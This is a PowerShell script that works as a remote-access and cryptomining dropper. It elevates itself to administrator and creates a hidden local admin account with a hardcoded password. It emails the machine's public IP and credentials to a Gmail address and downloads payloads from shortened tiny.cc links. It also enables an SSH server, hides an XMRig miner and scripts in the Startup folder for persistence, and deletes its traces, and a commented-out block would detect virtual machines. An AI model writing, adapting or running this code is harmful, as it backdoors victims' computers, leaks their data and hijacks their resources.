function random_text {
    return -join ((97..122)+(65..90) | Get-Random -Count 5 | % {[char]$_})
}

if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "& '" + $myinvocation.mycommand.definition + "'"
    Start-Process powershell -Verb runAs -ArgumentList $arguments
    Exit
} else {

    Set-Variable -Name username -Value ("...")
    Set-Variable -Name Password -Value (ConvertTo-SecureString ".V3n0m" -AsPlainText -Force)
    New-LocalUser $username -Description "Local admin account created via PowerShell" -FullName "..." -Password $Password
    Add-LocalGroupMember -Member $username -Group "Administrators"
}

# ### === PHASE 1: ENVIRONMENT SANITY CHECKS ===
# if ((Get-WmiObject Win32_ComputerSystem).Model -match "Virtual|VMware|Hyper-V" -or 
#     (Get-WmiObject Win32_Processor).NumberOfCores -lt 2 -or 
#     (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB -lt 4) {
#     exit
# }

Set-Variable -Name wd -Value (random_text)
Set-Variable -Value ("$env:temp\$wd") -Name path
Set-Variable -Name INITIALPATH -Value (Get-Location)
Set-Variable -Value "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -Name initial_dir

Set-Variable -Value (Get-Content PkUbTvqXFIdB.txt) -Name email
Set-Variable -Name password -Value (Get-Content NzKnmxLrbsBw.txt)

$PublicIP = Invoke-RestMethod -Uri "https://api64.ipify.org"

Set-Variable -Name ipFile -Value ("$initial_dir\ip.txt")
$PublicIP | Out-File -FilePath $ipFile

Set-Variable -Name configfile -Value ("$env:UserName.rat")
Set-Content -Path $configfile -Value ""
Add-Content -Value $PublicIP -Path $configfile
Add-Content -Path $configfile -Value $password
Add-Content -Value $INITIALPATH -Path $configfile
Add-Content -Value $env:temp -Path $configfile

Set-Variable -Name SecurePassword -Value (ConvertTo-SecureString $password -AsPlainText -Force)
Set-Variable -Name plainPassword -Value ([Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecurePassword)))
Add-Content -Value $plainPassword -Path $configfile

Send-MailMessage `
    -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, (ConvertTo-SecureString -Force -String $plainPassword -AsPlainText)) `
    -Port 587 `
    -From $email `
    -Subject "IP Address Notification from $env:UserName" `
    -UseSsl `
    -To $email `
    -SmtpServer "smtp.gmail.com" `
    -Attachment $configfile

Remove-Item -Path $configfile

mkdir $path
cd $path


Invoke-WebRequest -UseBasicParsing -OutFile "QyjAaZDBbNPk.reg" -Uri "http://tiny.cc/k5cg001"
Invoke-WebRequest -UseBasicParsing -OutFile "FoRAUwtxKkSB.vbs" -Uri "http://tiny.cc/s5cg001"
Invoke-WebRequest -UseBasicParsing -OutFile "w.bat" -Uri "http://tiny.cc/d6cg001"
Invoke-WebRequest -UseBasicParsing -OutFile "ZDaFvwjOosKx.vbs" -Uri "http://tiny.cc/y5cg001"
Invoke-WebRequest -Uri "http://tiny.cc/66cg001" -UseBasicParsing -OutFile "AEQKCPrkuifY.ps1"

Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -StartupType 'Automatic' -Name sshd
Get-NetFirewallRule -Name *ssh*

& "./QyjAaZDBbNPk.reg"
& "./FoRAUwtxKkSB.vbs"

#Set-Variable -Value "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -Name initial_dir

$tasks = "C:\Users\$env:USERNAME\Program Data\Microsoft\Windows"

Move-Item -Path "$path\ZDaFvwjOosKx.vbs" -Destination $initial_dir
Move-Item -Path "$path\AEQKCPrkuifY.ps1" -Destination $tasks


Start-Sleep -Seconds 30

New-Item -ItemType Directory -Name "$wd" -Path "$path"
cd $wd
Set-Variable -Name currentDir -Value ($Pwd)

Invoke-WebRequest -OutFile "xmrig-6.22.2-msvc-win64.zip" -Uri "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip"
Expand-Archive -Path "$currentDir\xmrig-6.22.2-msvc-win64.zip" -DestinationPath "$initial_dir"

Set-ItemProperty -Value "Hidden" -Path "$initial_dir\xmrig-6.22.2" -Name Attributes

Set-Variable -Name newConfigPath -Value ("$path\w.bat")
Set-Variable -Value ("$initial_dir\xmrig-6.22.2\w.bat") -Name targetConfigPath
if (Test-Path -Path $newConfigPath) {
    Copy-Item -Path $newConfigPath -Destination $targetConfigPath -Force
    Write-Output "bat file has been replaced successfully."
} else {
    Write-Output "New bat file not found at the specified path."
}

Remove-Item -Path "$initial_dir\ip.txt"

Set-Location -Path 'C:\Users'
if (Test-Path -Path '...' -PathType Container) {
    attrib +h +s +r ...
    Write-Output "... directory attributes set to hidden, system, and read-only"
} else {
    Write-Output "... directory does not exist"
    Exit 1
}


cd $path
Remove-Item -Path "w.bat"
Remove-Item -Path "QyjAaZDBbNPk.reg"
Remove-Item -Path "FoRAUwtxKkSB.vbs"

Set-ItemProperty -Path "$initial_dir\ZDaFvwjOosKx.vbs" -Name Attributes -Value "Hidden"

cd $initial_dir

#Invoke-WebRequest -UseBasicParsing -OutFile "edpnotify.ps1" -Uri "http://tiny.cc/g1pg001"

Start-Process -FilePath "cscript.exe" -windowstyle hidden -ArgumentList "ZDaFvwjOosKx.vbs"

#Start-Process -FilePath "$initial_dir\edpnotify.ps1" -windowstyle hidden

Set-ItemProperty -Name Attributes -Path "$tasks\AEQKCPrkuifY.ps1" -Value "Hidden"

Start-Process -FilePath "$tasks\AEQKCPrkuifY.ps1" -windowstyle hidden

Remove-Item -Path "$initial_dir\ip.txt"
Remove-Item -Path "$initial_dir\NzKnmxLrbsBw.txt"
Remove-Item -Path "$initial_dir\PkUbTvqXFIdB.txt"

Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
cd "$initial_dir\xmrig-6.22.2"
Remove-Item -Path "initial_dir\xmrig-6.22.2\config.json"

Start-Sleep -Seconds 340
# Start-Process -FilePath ".\w.bat" -NoNewWindow -Wait

& "./TMqhONoBljEv.vbs"

Start-Sleep -Seconds 340
Remove-Item -Path "$initial_dir\TMqhONoBljEv.vbs"
Remove-Item -Path "$initial_dir\BVrAihDwJNvc.ps1"
